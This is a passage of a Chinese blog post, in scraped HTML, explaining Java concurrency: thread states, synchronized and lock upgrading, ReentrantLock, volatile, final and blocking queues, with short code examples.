class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Thread3</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;我是子线程&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;异步调用成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Thread3</span>());</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask).start();</span><br><span class="line">        System.out.println(futureTask.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li>使用线程池</li></ul><h2 id="线程的六种状态"><a href="#线程的六种状态" class="headerlink" title="线程的六种状态"></a>线程的六种状态</h2><p><img src="/upload/2022/09/image-3261548c698141b3bec6117ec7e6fb16.png" alt="image.png"></p><ol><li>   初始(NEW)：新创建了一个线程对象，但还没有调用start()方法。</li><li>   运行(RUNNABLE)：Java线程中将就绪（ready）和运行中（running）两种状态笼统的称为“运行”。 线程对象创建后，其他线程(比如main线程）调用了该对象的start()方法。该状态的线程位于可运行线程池中，等待被线程调度选中，获取CPU的使用权，此时处于就绪状态（ready）。就绪状态的线程在获得CPU时间片后变为运行中状态（running）。</li><li>   阻塞(BLOCKED)：表示线程阻塞于锁。</li><li>   等待(WAITING)：进入该状态的线程需要等待其他线程做出一些特定动作（通知或中断）。</li><li>   超时等待(TIMED_WAITING)：该状态不同于WAITING，它可以在指定的时间后自行返回。</li><li>   终止(TERMINATED)：表示该线程已经执行完毕。</li></ol><h2 id="线程阻塞"><a href="#线程阻塞" class="headerlink" title="线程阻塞"></a>线程阻塞</h2><p>线程阻塞的几个方法</p><p>线程睡眠 Thread.sleep (long millis)方法当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。</p><p>线程等待 Object类中的wait()方法，导致当前的线程等待，直到其他线程调用此对象的 notify() 唤醒方法。</p><p>线程礼让 Thread.yield() 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。yield() 使得线程放弃当前分得的 CPU 时间，但是不使线程阻塞，即线程仍处于可执行状态，随时可能再次分得 CPU 时间。调用 yield() 的效果等价于调度程序认为该线程已执行了足够的时间从而转到另一个线程.</p><p>线程自闭 join()方法，等待其他线程终止。在当前线程中调用另一个线程的join()方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。</p><p>suspend() 和 resume() 两个方法配套使用，suspend()使得线程进入阻塞状态，并且不会自动恢复，必须其对应的resume() 被调用，才能使得线程重新进入可执行状态。典型地，suspend() 和 resume() 被用在等待另一个线程产生的结果的情形：测试发现结果还没有产生后，让线程阻塞，另一个线程产生了结果后，调用 resume() 使其恢复。<strong>Thread中suspend()和resume()两个方法在JDK1.5中已经废除</strong>，不再介绍。因为有死锁倾向。<br><img src="/upload/2022/09/image-50e694ea283446e3a7c431f910879965.png" alt="image.png"></p><h3 id="wait和sleep区别"><a href="#wait和sleep区别" class="headerlink" title="wait和sleep区别"></a>wait和sleep区别</h3><ul><li>wait 方法必须在 synchronized 保护的代码中使用，而 sleep 方法并没有这个要求。</li><li>wait 方法会主动释放 monitor 锁，在同步代码中执行 sleep 方法时，并不会释放 monitor 锁。</li><li>wait 方法意味着永久等待，直到被中断或被唤醒才能恢复，不会主动恢复，sleep 方法中会定义一个时间，时间到期后会主动恢复。</li><li>wait&#x2F;notify 是 Object 类的方法，而 sleep 是 Thread 类的方法。</li></ul><h1 id="synchronized关键字"><a href="#synchronized关键字" class="headerlink" title="synchronized关键字"></a>synchronized关键字</h1><p>synchronized可以修饰实例方法、静态方法、代码块，只需要加个关键字就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">// 这里我们修饰了静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">husband</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Java语言中存在两种内建的synchronized语法：synchronized语句、synchronized方法。 </p><ul><li>synchronized语句：当源代码被编译成字节码的时候，会在同步块的入口位置和退出位置分别插入monitorenter和monitorexit字节码指令; </li><li>synchronized方法：其会被翻译成普通的方法调用和返回指令如:invokevirtual、areturn指令，在VM字节码层面并没有任何特别的指令来实现被synchronized修饰的方法，而是在Class文件的方法表中将该方法的access_flags字段中的synchronized标志位置1，表示该方法是同步方法并使用调用该方法的对象或该方法所属的Class在JVM的内部对象表示Klass做为锁对象。</li></ul><h2 id="synchronized-如何实现线程同步"><a href="#synchronized-如何实现线程同步" class="headerlink" title="synchronized 如何实现线程同步"></a>synchronized 如何实现线程同步</h2><p>任何一个对象都由下面三个部分组成： 对象头+实例数据+填充数据<br>主要涉及到对象头和Monitor这两个概念</p><h3 id="对象头"><a href="#对象头" class="headerlink" title="对象头"></a>对象头</h3><p>synchronized是悲观锁，在操作同步资源的时候会给同步资源加上锁，这把锁就放在对象头里。以Hotspot虚拟机为例，Hotspot的对象头主要包括两部分数据：Mark Word（标记字段）、Klass Pointer（类型指针）。<br>Mark Word： 默认存储对象的HashCode，分代年龄和锁标志位信息。这些信息都是与对象自身定义无关的数据，所以Mark Word被设计成一个非固定的数据结构以便在极小的空间内存存储尽量多的数据。它会根据对象的状态复用自己的存储空间，也就是说在运行期间Mark Word里存储的数据会随着锁标志位的变化而变化。<br>Klass Point： 对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。</p><h3 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h3><p>Monitor可以理解为一个同步工具或一种同步机制，通常被描述为一个对象。每一个Java对象就有一把看不见的锁，称为内部锁或者Monitor锁。<br>Monitor是线程私有的数据结构，每一个线程都有一个可用monitor record列表，同时还有一个全局的可用列表。每一个被锁住的对象都会和一个monitor关联，同时monitor中有一个Owner字段存放拥有该锁的线程的唯一标识，表示该锁被这个线程占用。<br>总结一下就是：synchronized通过Monitor来实现线程同步，Monitor是依赖于底层的操作系统的Mutex Lock（互斥锁）来实现的线程同步。</p><h2 id="synchronized-底层实现"><a href="#synchronized-底层实现" class="headerlink" title="synchronized 底层实现"></a>synchronized 底层实现</h2><p>我们用一个最简单的功能来举例，下面这个就是我们的代码<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SyncDemo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sync</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">synchronized</span>(SyncDemo.class)&#123;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们编译为字节码后，效果如下<br> <img src="/upload/2022/09/image-127b2110d1934a4baddd5afa4545a0e0.png" alt="image.png"><br>我们可以清晰段看到，其实synchronized映射成字节码指令就是增加来两个指令：monitorenter和monitorexit。当一条线程进行执行的遇到monitorenter指令的时候，它会去尝试获得锁，如果获得锁那么锁计数+1（为什么会加一呢，因为它是一个可重入锁，所以需要用这个锁计数判断锁的情况），如果没有获得锁，那么阻塞。当它遇到monitorexit的时候，锁计数器-1，当计数器为0，那么就释放锁。<br>那么有的朋友看到这里就疑惑了，那图上有2个monitorexit呀？马上回答这个问题：上面我以前写的文章也有表述过， synchronized锁释放有两种机制，一种就是执行完释放；另外一种就是发送异常，虚拟机释放 。图中第二个monitorexit就是发生异常时执行的流程，这就是我开头说的“会有2个流程存在“。而且，从图中我们也可以看到在第13行，有一个goto指令，也就是说如果正常运行结束会跳转到19行执行。</p><h2 id="锁升级过程"><a href="#锁升级过程" class="headerlink" title="锁升级过程"></a>锁升级过程</h2><p>为什么需要锁升级呢，因为我们monitor默认使用的是Mutex Lock，这东西实际上是一个重锁，非常消耗资源，在JDK6中，为了减少性能消耗，就引入了锁升级的概念，具体过程如下<br>无锁-&gt;偏向锁-&gt;轻量级锁 -&gt;重量级锁 （过程不可逆）<br> <img src="/upload/2022/09/image-0ee4bb04dcc54e9fa1d8314bfe4a5fdd.png" alt="image.png"></p><h3 id="无锁"><a href="#无锁" class="headerlink" title="无锁"></a>无锁</h3><p>无锁不会对资源进行锁定，所有的线程都能访问并修改同一个资源，但同时只有一个线程能修改成功。<br>无锁的特点就是修改操作在循环内进行，线程会不断的尝试修改共享资源。如果没有冲突就修改成功并退出，否则就会继续循环尝试。<strong>本质上就是通过CAS来实现的</strong></p><h3 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h3><p><strong>偏向锁是指一段同步代码一直被一个线程所访问，那么该线程会自动获取锁，降低获取锁的代价。</strong></p><p>在大多数情况下，锁总是由同一线程多次获得，不存在多线程竞争，所以出现了偏向锁。其目标就是在只有一个线程执行同步代码块时能够提高性能。</p><p>当一个线程访问同步代码块并获取锁时，会在Mark Word里存储锁偏向的线程ID。在线程进入和退出同步块时不再通过CAS操作来加锁和解锁，而是检测Mark Word里是否存储着指向当前线程的偏向锁。引入偏向锁是为了在无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径，因为轻量级锁的获取及释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令即可。</p><p>偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待全局安全点（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态。撤销偏向锁后恢复到无锁（标志位为“01”）或轻量级锁（标志位为“00”）的状态。</p><p>偏向锁在JDK 6及以后的JVM里是默认启用的。可以通过JVM参数关闭偏向锁：-XX:-UseBiasedLocking&#x3D;false，关闭之后程序默认会进入轻量级锁状态。</p><h3 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h3><p>是指当锁是偏向锁的时候，被另外的线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞，从而提高性能。</p><p>在代码进入同步块的时候，如果同步对象锁状态为无锁状态（锁标志位为“01”状态，是否为偏向锁为“0”），虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的Mark Word的拷贝，然后拷贝对象头中的Mark Word复制到锁记录中。</p><p>拷贝成功后，虚拟机将使用CAS操作尝试将对象的Mark Word更新为指向Lock Record的指针，并将Lock Record里的owner指针指向对象的Mark Word。</p><p>如果这个更新动作成功了，那么这个线程就拥有了该对象的锁，并且对象Mark Word的锁标志位设置为“00”，表示此对象处于轻量级锁定状态。</p><p>如果轻量级锁的更新操作失败了，虚拟机首先会检查对象的Mark Word是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行，否则说明多个线程竞争锁。</p><p>若当前只有一个等待线程，则该线程通过自旋进行等待。但是当自旋超过一定的次数，或者一个线程在持有锁，一个在自旋，又有第三个来访时，轻量级锁升级为重量级锁。</p><h3 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h3><p>升级为重量级锁时，锁标志的状态值变为“10”，此时Mark Word中存储的是指向重量级锁的指针，此时等待锁的线程都会进入阻塞状态。</p><p>综上，偏向锁通过对比Mark Word解决加锁问题，避免执行CAS操作。而轻量级锁是通过用CAS操作和自旋来解决加锁问题，避免线程阻塞和唤醒而影响性能。重量级锁是将除了拥有锁的线程以外的线程都阻塞。</p><h2 id="对象锁和类锁"><a href="#对象锁和类锁" class="headerlink" title="对象锁和类锁"></a>对象锁和类锁</h2><p>java的对象锁和类锁：java的对象锁和类锁在锁的概念上基本上和内置锁是一致的，但是，两个锁实际是有很大的区别的，对象锁是用于对象实例方法，或者一个实例对象上的，类锁是用于类的静态方法或者一个类的class对象上的。我们知道，类的实例对象可以有很多个，但是每个类只有一个class对象，所以不同实例对象的对象锁是互不干扰的，但是每个类只有一个类锁。但是有一点必须注意的是，其实类锁只是一个概念上的东西，并不是真实存在的，它只是用来帮助我们理解锁定实例方法和静态方法的区别的。</p><h3 id="对象锁"><a href="#对象锁" class="headerlink" title="对象锁"></a>对象锁</h3><p>当一个对象中有同步方法或者同步块，线程调用此对象进入该同步区域时，必须获得对象锁。如果此对象的对象锁被其他调用者占用，则进入阻塞队列，等待此锁被释放（同步块正常返回或者抛异常终止，由JVM自动释放对象锁）。 注意，方法锁也是一种对象锁。当一个线程访问一个带synchronized方法时，由于对象锁的存在，所有加synchronized的方法都不能被访问（前提是在多个线程调用的是同一个对象实例中的方法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">object</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;我是对象锁也是方法锁&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">object</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">synchronized</span>(<span class="built_in">this</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;我是对象锁&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类锁"><a href="#类锁" class="headerlink" title="类锁"></a>类锁</h3><p>一个class其中的静态方法和静态变量在内存中只会加载和初始化一份，所以，一旦一个静态的方法被申明为synchronized，此类的所有的实例化对象在调用该方法时，共用同一把锁，称之为类锁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">object</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;我是第一种类锁&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">object</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">synchronized</span> (object.<span class="built_in">this</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;我是第二种类锁&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="更深一层"><a href="#更深一层" class="headerlink" title="更深一层"></a>更深一层</h2><p>如果再深入到源码来说，synchronized实际上有两个队列waitSet和entryList。<br>1.当多个线程进入同步代码块时，首先进入entryList<br>2.有一个线程获取到monitor锁后，就赋值给当前线程，并且计数器+1<br>3.如果线程调用wait方法，将释放锁，当前线程置为null，计数器-1，同时进入waitSet等待被唤醒，调用notify或者notifyAll之后又会进入entryList竞争锁<br>4.如果线程执行完毕，同样释放锁，计数器-1，当前线程置为null</p><h1 id="synchronized与Lock的区别"><a href="#synchronized与Lock的区别" class="headerlink" title="synchronized与Lock的区别"></a>synchronized与Lock的区别</h1><p>我还以为Lock是啥玩意，其实Lock只是一个接口（特地看了一下java的源码），然后java里面有好几个类实现了这个接口，其中最著名的就是 ReentrantLock 了。先说一下大概的区别</p><table><thead><tr><th>类别</th><th>synchronized</th><th>Lock</th></tr></thead><tbody><tr><td>存在层次</td><td>Java的关键字，在jvm层面上</td><td>是一个类</td></tr><tr><td>锁的释放</td><td>1、以获取锁的线程执行完同步代码，释放锁 2、线程执行发生异常，jvm会让线程释放锁</td><td>在finally中必须释放锁，不然容易造成线程死锁</td></tr><tr><td>锁的获取</td><td>假设A线程获得锁，B线程等待。如果A线程阻塞，B线程会一直等待</td><td>分情况而定，Lock有多个锁获取的方式，具体下面会说道，大致就是可以尝试获得锁，线程可以不用一直等待</td></tr><tr><td>锁状态</td><td>无法判断</td><td>可以判断</td></tr><tr><td>锁类型</td><td>可重入 不可中断 非公平</td><td>可重入 可判断 可公平（两者皆可）</td></tr><tr><td>性能</td><td>少量同步</td><td>大量同步</td></tr></tbody></table><p>然后lock里面有下面几个方法</p><p>lock()：获取锁，如果锁被暂用则一直等待<br>unlock():释放锁<br>tryLock(): 注意返回类型是boolean，如果获取锁的时候锁被占用就返回false，否则返回true<br>tryLock(long time, TimeUnit unit)：比起tryLock()就是给了一个时间期限，保证等待参数时间<br>lockInterruptibly()：用该锁的获得方式，如果线程在获取锁的阶段进入了等待，那么可以中断此线程，先去做别的事</p><p>这里说一下这东西怎么使用吧，首先就是需要加锁，最后我们再释放锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            count += n;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体回答（如果面试官问起来，我们可以这样回答）</p><ul><li>ReentrantLock 拥有Synchronized相同的并发性和内存语义，此外还多了 锁投票，定时锁等候和中断锁等候。线程A和B都要获取对象O的锁定，假设A获取了对象O锁，B将等待A释放对O的锁定，如果使用 synchronized ，如果A不释放，B将一直等下去，不能被中断，如果 使用ReentrantLock，如果A不释放，可以使B在等待了足够长的时间以后，中断等待，而干别的事情</li><li>synchronized是在JVM层面上实现的，不但可以通过一些监控工具监控synchronized的锁定，而且在代码执行时出现异常，JVM会自动释放锁定，但是使用Lock则不行，lock是通过代码实现的，要保证锁定一定会被释放，就必须将unLock()放到finally{}中</li><li>在资源竞争不是很激烈的情况下，Synchronized的性能要优于ReetrantLock，但是在资源竞争很激烈的情况下，Synchronized的性能会下降几十倍，但是ReetrantLock的性能能维持常态；</li></ul><p>那么这两个东西应该如何选择呢</p><p>synchronized原语和ReentrantLock在一般情况下没有什么区别，但是在非常复杂的同步应用中，请考虑使用ReentrantLock，特别是遇到下面需求的时候。</p><p>1.某个线程在等待一个锁的控制权的这段时间需要中断<br>2.需要分开处理一些wait-notify，ReentrantLock里面的Condition应用，能够控制notify哪个线程<br>3.具有公平锁功能，每个到来的线程都将排队等候</p><p>ReentrantLock的lock机制有2种，忽略中断锁和响应中断锁，这给我们带来了很大的灵活性。比如：如果A、B2个线程去竞争锁，A线程得到了锁，B线程等待，但是A线程这个时候实在有太多事情要处理，就是一直不返回，B线程可能就会等不及了，想中断自己，不再等待这个锁了，转而处理其他事情。这个时候ReentrantLock就提供了2种机制，第一，B线程中断自己（或者别的线程中断它），但是ReentrantLock不去响应，继续让B线程等待，你再怎么中断，我全当耳边风（synchronized原语就是如此)。第二，B线程中断自己（或者别的线程中断它），ReentrantLock处理了这个中断，并且不再等待这个锁的到来，完全放弃。</p><h1 id="ReentrantLock（可重入锁）"><a href="#ReentrantLock（可重入锁）" class="headerlink" title="ReentrantLock（可重入锁）"></a>ReentrantLock（可重入锁）</h1><p>相比于synchronized，ReentrantLock需要显式的获取锁和释放锁，相对现在基本都是用JDK7和JDK8的版本，ReentrantLock的效率和synchronized区别基本可以持平了。他们的主要区别有以下几点：</p><ol><li>等待可中断，当持有锁的线程长时间不释放锁的时候，等待中的线程可以选择放弃等待，转而处理其他的任务。</li><li>公平锁：synchronized和ReentrantLock默认都是非公平锁，但是ReentrantLock可以通过构造函数传参改变。只不过使用公平锁的话会导致性能急剧下降。</li><li>绑定多个条件：ReentrantLock可以同时绑定多个Condition条件对象。</li></ol><p>ReentrantLock基于AQS(AbstractQueuedSynchronizer 抽象队列同步器)实现。</p><h1 id="Volatile关键字"><a href="#Volatile关键字" class="headerlink" title="Volatile关键字"></a>Volatile关键字</h1><p>一旦一个共享变量（类的成员变量、类的静态成员变量）被volatile修饰之后，那么就具备了两层语义：</p><ul><li>保证了不同线程对这个变量进行操作时的可见性，即一个线程修改了某个变量的值，这新值对其他线程来说是立即可见的。</li><li>禁止进行指令重排序（为了提高性能，CPU会修改指令的执行顺序）。</li></ul><h2 id="Volatile如何保证指令不会重排序"><a href="#Volatile如何保证指令不会重排序" class="headerlink" title="Volatile如何保证指令不会重排序"></a>Volatile如何保证指令不会重排序</h2><p>使用了内存屏障技术，在生成指令系列时在适当的位置会插入内存屏障指令来禁止特定类型的处理器重排序。</p><h2 id="可见性是如何保证的"><a href="#可见性是如何保证的" class="headerlink" title="可见性是如何保证的"></a>可见性是如何保证的</h2><p>使用了 MESI（IllinoisProtocol 缓存一致性协议） 来保证指令一致性</p><p>当多个处理器的运算任务都涉及同一块主内存区域时，将可能导致各自的缓存数据不一致，如果发现操作的变量是共享变量，即在其他CPU中也存在该变量的副本，会发出信号通知其他CPU将该变量的缓存行置为无效状态，因此当其他CPU需要读取这个变量时，发现自己缓存中缓存该变量的缓存行是无效的，那么它就会从内存重新读取。</p><p>怎么发现数据是否失效？（使用了嗅探技术）</p><h2 id="Volatile为什么不能保证原子性"><a href="#Volatile为什么不能保证原子性" class="headerlink" title="Volatile为什么不能保证原子性"></a>Volatile为什么不能保证原子性</h2><p>Java中只有对基本类型变量的赋值和读取是原子操作，如i &#x3D; 1的赋值操作，但是像j &#x3D; i或者i++这样的操作都不是原子操作，因为他们都进行了多次原子操作，比如先读取i的值，再将i的值赋值给j，两个原子操作加起来就不是原子操作了。</p><p>所以，如果一个变量被volatile修饰了，那么肯定可以保证每次读取这个变量值的时候得到的值是最新的，但是一旦需要对变量进行自增这样的非原子操作，就不会保证这个变量的原子性了。</p><p>所以一般情况下我们只对volatile进行读取操作，而不是修改操作。</p><h2 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h2><p>单例模式里面用的到，单例有8种写法，其中有一种叫双重检验用到了这个<br><img src="/upload/2022/09/image-121c5c51bc664b2da521a399625b7ca0.png" alt="image.png"></p><ol><li>volatile修饰符适用于以下场景：某个属性被多个线程共享，其中有一个线程修改了此属性，其他线程可以立即得到修改后的值，比如booleanflag;或者作为触发器，实现轻量级同步。</li><li>volatile属性的读写操作都是无锁的，它不能替代synchronized，因为它没有提供原子性和互斥性。因为无锁，不需要花费时间在获取锁和释放锁_上，所以说它是低成本的。</li><li>volatile只能作用于属性，我们用volatile修饰属性，这样compilers就不会对这个属性做指令重排序。</li><li>volatile提供了可见性，任何一个线程对其的修改将立马对其他线程可见，volatile属性不会被线程缓存，始终从主 存中读取。</li><li>volatile提供了happens-before保证，对volatile变量v的写入happens-before所有其他线程后续对v的读操作。</li><li>volatile可以使得long和double的赋值是原子的。</li><li>volatile可以在单例双重检查中实现可见性和禁止指令重排序，从而保证安全性。</li></ol><h2 id="volatile与synchronized的区别"><a href="#volatile与synchronized的区别" class="headerlink" title="volatile与synchronized的区别"></a>volatile与synchronized的区别</h2><ol><li>volatile只能修饰实例变量和类变量，而synchronized可以修饰方法，以及代码块。</li><li>volatile保证数据的可见性，但是不保证原子性(多线程进行写操作，不保证线程安全);而synchronized是一种排他(互斥)的机制。</li><li>volatile用于禁止指令重排序：可以解决单例双重检查对象初始化代码执行乱序问题。</li><li>volatile可以看做是轻量版的synchronized，volatile不保证原子性，但是如果是对一个共享变量进行多个线程的赋值，而没有其他的操作，那么就可以用volatile来代替synchronized，因为赋值本身是有原子性的，而volatile又保证了可见性，所以就可以保证线程安全了。</li></ol><h1 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h1><p>final在Java中是一个保留的关键字，可以声明成员变量、方法、类以及本地变量。一旦你将引用声明作final，你将不能改变这个引用了，编译器会检查代码，如果你试图将变量再次初始化的话，编译器会报编译错误。</p><p>final变量经常和static关键字一起使用，作为常量。</p><h2 id="final方法"><a href="#final方法" class="headerlink" title="final方法"></a>final方法</h2><p>final也可以声明方法。方法前面加上final关键字，代表这个方法不可以被子类的方法 重写 。如果你认为一个方法的功能已经足够完整了，子类中不需要改变的话，你可以声明此方法为final。final方法比非final方法要快，因为在编译的时候已经静态绑定了，不需要在运行时再动态绑定。</p><h2 id="final类"><a href="#final类" class="headerlink" title="final类"></a>final类</h2><p>使用final来修饰的类叫作final类。final类通常功能是完整的，它们不能被继承。Java中有许多类是final的，譬如String, Interger以及其他包装类。</p><h2 id="final关键字的好处"><a href="#final关键字的好处" class="headerlink" title="final关键字的好处"></a>final关键字的好处</h2><p>final关键字提高了性能。JVM和Java应用都会缓存final变量。<br>final变量可以安全的在多线程环境下进行共享，而不需要额外的同步开销。<br>使用final关键字，JVM会对方法、变量及类进行优化。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>final关键字可以用于成员变量、本地变量、方法以及类。<br>final成员变量必须在声明的时候初始化或者在构造器中初始化，否则就会报编译错误。<br>你不能够对final变量再次赋值。<br>本地变量必须在声明时赋值。<br>在匿名类中所有变量都必须是final变量。<br>final方法不能被重写。<br>final类不能被继承。<br>final关键字不同于finally关键字，后者用于异常处理。<br>final关键字容易与finalize()方法搞混，后者是在Object类中定义的方法，是在垃圾回收之前被JVM调用的方法。<br>接口中声明的所有变量本身是final的。<br>final和abstract这两个关键字是反相关的，final类就不可能是abstract的。<br>final方法在编译阶段绑定，称为静态绑定(static binding)。<br>没有在声明时初始化final变量的称为空白final变量(blank final variable)，它们必须在构造器中初始化，或者调用this()初始化。不这么做的话，编译器会报错“final变量(变量名)需要进行初始化”。<br>将类、方法、变量声明为final能够提高性能，这样JVM就有机会进行估计，然后优化。<br>按照Java代码惯例，final变量就是常量，而且通常常量名要大写</p><h1 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h1><p>默认使用的队列都是非阻塞的，不会阻塞当前线程，而阻塞队列会阻塞当前线程， 常用于线程池和生产者消费者的问题中</p><p>当阻塞队列进行插入数据时，如果队列已满，线程将会阻塞等待直到队列非满；从阻塞队列取数据时，如果队列已空，线程将会阻塞等待直到队列非空。</p><p>延时阻塞队列（DelayQueue） 只有当其指定的延迟时间到了，才能够从队列中获取到该元素</p><h1 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h1><p>通常情况下，我们创建的变量是可以被任何一个线程访问并修改的。如果想实现每一个线程都有自己的专属本地变量该如何解决呢？ 使用ThreadLocal类。 